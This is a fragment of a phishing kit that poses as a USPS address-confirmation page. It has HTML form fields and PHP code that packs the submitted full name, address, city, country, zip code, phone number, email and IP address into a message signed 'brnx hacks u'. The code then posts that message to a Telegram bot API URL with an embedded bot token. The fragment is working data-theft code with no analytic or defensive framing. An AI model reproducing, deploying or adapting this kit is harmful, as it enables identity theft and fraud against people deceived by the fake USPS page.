...
$message = "-------------------- <3 brnx hacks u <3-------------------\nFull Name : ".$_POST['fullname']."\nAddress 1 : ".$_POST['add1']."\nAddress 2 : ".$_POST['add2']."\nCity      : ".$_POST['city']."\nCountry  : ".$_POST['ct']."\nzip Code  : ".$_POST['zipp']."\nPhone num  : ".$_POST['phonee']."\nEmail   : ".$_POST['email']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot8696033303:AAFFPZRCO9ttr2m2IaMT622C7vsI3OG4zPo/sendMessage';
...
<br>
<input type="text" name="ct" maxlength="50" placeholder="Country" tabindex="10" required=""  id="tcity" class="form-control">
<br>
<br>
...
<br>
<input type="email" name="email" maxlength="30" required=""  placeholder="Email" tabindex="8" id="taddress" class="form-control">
